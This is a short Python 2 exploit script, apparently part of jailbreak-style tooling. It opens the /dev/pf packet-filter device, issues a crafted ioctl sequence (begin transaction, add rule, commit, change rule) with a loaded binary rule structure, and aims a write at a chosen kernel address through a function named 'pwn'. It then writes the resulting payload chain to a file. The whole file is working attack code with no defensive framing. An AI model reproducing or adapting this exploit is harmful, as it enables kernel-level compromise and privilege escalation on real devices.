#!/opt/local/bin/python2.6
from world2 import *

init('PC')
make_avail()

sizeof_pfioc_trans = 16
sizeof_pfioc_rule = 3016
sizeof_pfioc_pooladdr = 1136

IOCPARM_MASK = 0x1fff
IOC_VOID = 0x20000000
IOC_OUT = 0x40000000
IOC_IN = 0x80000000
IOC_INOUT = IOC_IN | IOC_OUT

_IOC = lambda inout, group, num, len: (inout | ((len & IOCPARM_MASK) << 16) | (ord(group) << 8) | num)

_IO = lambda g, n: _IOC(IOC_VOID, g, n, 0)
_IOWR = lambda g, n, t: _IOC(IOC_INOUT, g, n, t)

DIOCSTART = _IO('D', 1)
DIOCSTOP = _IO('D', 2)
DIOCXBEGIN = _IOWR('D', 81, sizeof_pfioc_trans)
DIOCBEGINADDRS = _IOWR('D', 51, sizeof_pfioc_pooladdr)
DIOCADDRULE = _IOWR('D',  4, sizeof_pfioc_rule)
DIOCXCOMMIT = _IOWR('D', 82, sizeof_pfioc_trans)
DIOCCHANGERULE = _IOWR('D', 26, sizeof_pfioc_rule)

trans_e = ptr(struct.pack('I1024sI', 1, '', 0))
trans = ptrI(1, 4+1024+4, trans_e)

pffd = ptrI(0)
funcall('_open', ptr('/dev/pf', True), 2)
store_r0_to(pffd)

funcall('_ioctl', pffd, DIOCSTOP, load_r0=True)
funcall('_ioctl', pffd, DIOCSTART, load_r0=True)

pr = ptr(open('transe_pr.bin').read())
def pwn(addr):

    set_r0_to(addr)
    store_r0_to(pr + 0xad0)
    funcall('_ioctl', pffd, DIOCXBEGIN, trans, load_r0=True)
    funcall('_ioctl', pffd, DIOCBEGINADDRS, pr + 8 - 4, load_r0=True)
    load_r0_from(trans_e + (4+1024))
    store_r0_to(pr + 4)
    funcall('_ioctl', pffd, DIOCADDRULE, pr, load_r0=True)
    funcall('_ioctl', pffd, DIOCXCOMMIT, trans, load_r0=True)
    set_r0_to(5)
    store_r0_to(pr)
    funcall('_ioctl', pffd, DIOCCHANGERULE, pr, load_r0=True)
    # boom?

pwn(0xdeadbeef)

final = finalize(0x10000000)
open('transe.bin', 'w').write(final)
